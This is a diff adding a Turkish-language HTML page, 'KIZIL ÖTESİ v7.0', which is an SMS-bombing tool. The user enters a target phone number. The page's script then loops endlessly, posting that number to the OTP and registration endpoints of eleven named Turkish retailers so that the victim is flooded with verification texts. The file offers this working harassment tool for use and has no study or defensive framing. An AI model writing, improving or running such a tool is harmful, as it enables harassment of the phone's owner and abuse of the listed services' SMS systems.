@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KIZIL ÖTESİ - v7.0</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #050505;
+            color: #ffffff;
+            font-family: 'Consolas', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 15px;
+        }
+        .container {
+            width: 100%;
+            max-width: 550px;
+            background: #0d0101;
+            padding: 25px;
+            border-radius: 12px;
+            border: 2px solid #ff1e1e;
+            box-shadow: 0 0 25px rgba(255, 30, 30, 0.3);
+        }
+        h1 {
+            color: #ff1e1e;
+            font-size: 2.3rem;
+            text-align: center;
+            text-shadow: 0 0 15px rgba(255, 30, 30, 0.6);
+            margin-bottom: 5px;
+            letter-spacing: 2px;
+        }
+        .subtitle {
+            text-align: center;
+            font-size: 11px;
+            color: #883333;
+            margin-bottom: 20px;
+        }
+        label {
+            font-size: 12px;
+            font-weight: bold;
+            color: #ff8080;
+            display: block;
+            margin-bottom: 8px;
+        }
+        input {
+            font-size: 20px;
+            padding: 12px;
+            width: 100%;
+            text-align: center;
+            background: #1a0505;
+            color: #ff4d4d;
+            border: 2px solid #551a1a;
+            border-radius: 6px;
+            outline: none;
+            margin-bottom: 20px;
+        }
+        input:focus {
+            border-color: #ff1e1e;
+            box-shadow: 0 0 10px rgba(255, 30, 30, 0.4);
+        }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+        }
+        button {
+            font-size: 14px;
+            font-weight: bold;
+            padding: 12px 20px;
+            cursor: pointer;
+            border: none;
+            border-radius: 6px;
+            transition: 0.2s;
+            flex: 1;
+        }
+        .btn-baslat {
+            background-color: #ff1e1e;
+            color: white;
+        }
+        .btn-baslat:hover {
+            background-color: #d40000;
+            box-shadow: 0 0 15px #ff1e1e;
+        }
+        .btn-durdur {
+            background-color: #331111;
+            color: #ff8080;
+            border: 1px solid #ff1e1e;
+        }
+        .btn-durdur:hover {
+            background-color: #551111;
+        }
+        #stats {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ff4d4d;
+            font-weight: bold;
+            text-align: center;
+        }
+        #console {
+            margin-top: 15px;
+            background: #020000;
+            color: #ff1e1e;
+            text-align: left;
+            padding: 12px;
+            height: 140px;
+            overflow-y: auto;
+            font-size: 11px;
+            border-radius: 6px;
+            border: 1px solid #330000;
+            word-break: break-all;
+        }
+
+        /* Mobil Uyum (Responsive) Ayarları */
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+            .container {
+                padding: 15px;
+            }
+            input {
+                font-size: 18px;
+                padding: 10px;
+            }
+            button {
+                padding: 10px;
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>KIZIL ÖTESİ</h1>
+        <div class="subtitle">İNFRARED SİSTEMİ v7.0</div>
+        
+        <label>HEDEF NUMARAYI GİRİNİZ (Başında 0 olmadan)</label>
+        <input type="text" id="telefon" placeholder="5XXXXXXXXX" maxlength="10">
+        
+        <div class="btn-group">
+            <button class="btn-baslat" onclick="baslat()">BAŞLAT</button>
+            <button class="btn-durdur" onclick="durdur()">DURDUR</button>
+        </div>
+
+        <div id="stats">GÖNDERİLEN: 0</div>
+        <div id="console">[Kızıl Ötesi Sistem Hazır...]</div>
+    </div>
+
+    <script>
+        let calisiyor = false;
+        let sayac = 0;
+
+        function logEkle(mesaj) {
+            const consoleDiv = document.getElementById("console");
+            let tarih = new Date().toLocaleTimeString();
+            consoleDiv.innerHTML += `[${tarih}] ${mesaj}<br>`;
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        }
+
+        const servisler = [
+            { isim: "Trendyol", url: "https://pams.trendyol.com/api/v1/register/phone-verification" },
+            { isim: "Getir", url: "https://getir.com/api/v2/direct/check-phone-number" },
+            { isim: "Migros", url: "https://www.migros.com.tr/api/v1/login/otp/send" },
+            { isim: "Kahve Dünyası", url: "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number" },
+            { isim: "Dominos", url: "https://frontend.dominos.com.tr/api/customer/sendOtpCode" },
+            { isim: "File Market", url: "https://www.file.com.tr/api/v1/auth/otp" },
+            { isim: "Bim", url: "https://bim.veesk.net/service/v1.0/account/login" },
+            { isim: "Yemeksepeti", url: "https://www.yemeksepeti.com/api/v1/login" },
+            { isim: "Şok", url: "https://api.cepte-sok.com/api/v1/auth/login" },
+            { isim: "Gratis", url: "https://www.gratis.com/api/v1/auth/send-otp" },
+            { isim: "Watsons", url: "https://www.watsons.com.tr/api/v1/login/otp" }
+        ];
+
+        async function baslat() {
+            const telefon = document.getElementById("telefon").value.trim();
+            const stats = document.getElementById("stats");
+
+            if(telefon.length !== 10) {
+                alert("Numarayı başında 0 olmadan 10 haneli girin!");
+                return;
+            }
+
+            if(calisiyor) return;
+
+            calisiyor = true;
+            sayac = 0;
+            stats.innerText = `GÖNDERİLEN: ${sayac}`;
+            logEkle(`KIZIL ÖTESİ DEVREDE: ${telefon} hedefleniyor...`);
+
+            while(calisiyor) {
+                for (let servis of servisler) {
+                    if (!calisiyor) break;
+                    
+                    try {
+                        fetch(servis.url, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ phone: telefon })
+                        }).catch(() => {});
+
+                        sayac++;
+                        stats.innerText = `GÖNDERİLEN: ${sayac}`;
+                        logEkle(`BAŞARILI >> ${servis.isim}`);
+                    } catch(e) {
+                        logEkle(`REDDEDİLDİ >> ${servis.isim}`);
+                    }
+
+                    await new Promise(r => setTimeout(r, 150));
+                }
+            }
+        }
+
+        function durdur() {
+            calisiyor = false;
+            document.getElementById("stats").innerText = `DURUM: DURDURULDU (Toplam: ${sayac})`;
+            logEkle("Sistem durduruldu.");
+        }
+    </script>
+
+</body>
+</html>
